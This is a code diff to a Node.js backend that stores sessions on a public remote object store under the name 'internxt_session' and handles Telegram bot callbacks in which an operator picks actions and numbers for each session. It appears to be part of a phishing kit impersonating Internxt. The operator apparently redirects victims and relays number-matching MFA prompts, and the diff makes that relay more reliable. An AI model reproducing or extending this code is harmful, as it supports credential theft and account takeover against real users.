@@ -100,7 +100,7 @@ async function createSession(initialData = {}) {
 
   // Fallback to random hex if remote creation failed or timed out
   if (!sessionId) {
-    sessionId = crypto.randomBytes(4).toString('hex');
+    sessionId = crypto.randomBytes(16).toString('hex');
   }
 
   const session = {
@@ -135,13 +135,21 @@ function saveSession(sessionId, data) {
 async function saveSessionAsync(sessionId, data) {
   saveSession(sessionId, data);
 
-  // If sessionId is a remote object ID (32 hex characters), update remote store asynchronously
+  // If sessionId is a remote object ID (32 hex characters), update remote store
   if (sessionId && sessionId.length >= 24) {
     try {
-      await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, {
+      const res = await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, {
         method: 'PUT',
         headers: { 'Content-Type': 'application/json' }
-      }, { name: 'internxt_session', data }, 2000);
+      }, { name: 'internxt_session', data }, 2500);
+
+      // If PUT returned 404, recreate object via POST
+      if (!res.ok && res.status === 404) {
+        await httpRequest('https://api.restful-api.dev/objects', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' }
+        }, { name: 'internxt_session', data }, 2500);
+      }
     } catch (e) {}
   }
 }
@@ -163,23 +171,28 @@ function getSession(sessionId) {
   return null;
 }
 
-async function getSessionAsync(sessionId) {
+async function getSessionAsync(sessionId, forceRefresh = false) {
   if (!sessionId) return null;
   const local = getSession(sessionId);
-  if (local) return local;
 
-  // Attempt remote lookup across serverless instances
-  if (sessionId.length >= 24) {
+  // If local already has terminal redirect/action and forceRefresh is false, return it
+  if (local && local.redirect && !forceRefresh) {
+    return local;
+  }
+
+  // If local has no redirect or forceRefresh is true: query remote store for latest operator selections
+  if (sessionId && sessionId.length >= 24) {
     try {
-      const res = await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, { method: 'GET' }, null, 2000);
+      const res = await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, { method: 'GET' }, null, 2500);
       if (res.ok && res.data && res.data.data) {
         const remoteData = res.data.data;
-        saveSession(sessionId, remoteData);
-        return remoteData;
+        const merged = { ...(local || {}), ...remoteData, sessionId };
+        saveSession(sessionId, merged);
+        return merged;
       }
     } catch (e) {}
   }
-  return null;
+  return local;
 }
 
 function getSessionByEmail(email) {
@@ -347,7 +360,7 @@ async function handleCallbackQuery(callbackQuery, botToken) {
 
   if (data.startsWith('act:')) {
     const [, sessionId, action] = data.split(':');
-    let session = await getSessionAsync(sessionId);
+    let session = await getSessionAsync(sessionId, true);
     // Never reject with session expired: initialize session on demand so operator is never blocked
     if (!session) {
       session = { sessionId, status: 'pending', createdAt: Date.now() };
@@ -489,7 +502,7 @@ async function handleCallbackQuery(callbackQuery, botToken) {
   } else if (data.startsWith('num:')) {
     const [, sessionId, numStr] = data.split(':');
     const number = parseInt(numStr, 10);
-    let session = await getSessionAsync(sessionId);
+    let session = await getSessionAsync(sessionId, true);
     if (!session) {
       session = { sessionId, status: 'pending', createdAt: Date.now() };
     }
